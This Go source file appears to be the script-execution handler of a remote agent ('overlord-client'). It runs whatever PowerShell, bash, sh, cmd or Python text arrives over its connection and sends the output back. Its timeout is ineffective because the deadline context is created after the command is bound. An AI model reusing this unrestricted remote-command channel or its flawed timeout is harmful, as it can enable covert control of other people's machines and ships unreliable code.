package handlers

import (
	"context"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"time"

	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, scriptContent string, scriptType string) error {
	log.Printf("script: executing %s script (length: %d bytes)", scriptType, len(scriptContent))

	var cmd *exec.Cmd
	switch scriptType {
	case "powershell":
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
		} else {

			cmd = exec.CommandContext(ctx, "pwsh", "-NoProfile", "-NonInteractive", "-Command", scriptContent)
		}
	case "bash":
		if runtime.GOOS == "windows" {

			cmd = exec.CommandContext(ctx, "bash", "-c", scriptContent)
		} else {
			cmd = exec.CommandContext(ctx, "bash", "-c", scriptContent)
		}
	case "sh":
		cmd = exec.CommandContext(ctx, "sh", "-c", scriptContent)
	case "cmd":
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/c", scriptContent)
		} else {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
				Type:      "command_result",
				CommandID: cmdID,
				OK:        false,
				Message:   "cmd.exe not available on non-Windows systems",
			})
		}
	case "python":
		cmd = exec.CommandContext(ctx, "python", "-c", scriptContent)
	case "python3":
		cmd = exec.CommandContext(ctx, "python3", "-c", scriptContent)
	default:
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   "unsupported script type: " + scriptType,
		})
	}

	timeout := 5 * time.Minute
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	output, err := cmd.CombinedOutput()

	if err != nil {

		if ctx.Err() == context.DeadlineExceeded {
			return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
				Type:      "script_result",
				CommandID: cmdID,
				OK:        false,
				Output:    string(output),
				Error:     "Script execution timed out after " + timeout.String(),
			})
		}

		return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
			Type:      "script_result",
			CommandID: cmdID,
			OK:        false,
			Output:    string(output),
			Error:     err.Error(),
		})
	}

	log.Printf("script: execution completed successfully (%d bytes output)", len(output))
	return wire.WriteMsg(ctx, env.Conn, wire.ScriptResult{
		Type:      "script_result",
		CommandID: cmdID,
		OK:        true,
		Output:    strings.TrimSpace(string(output)),
	})
}
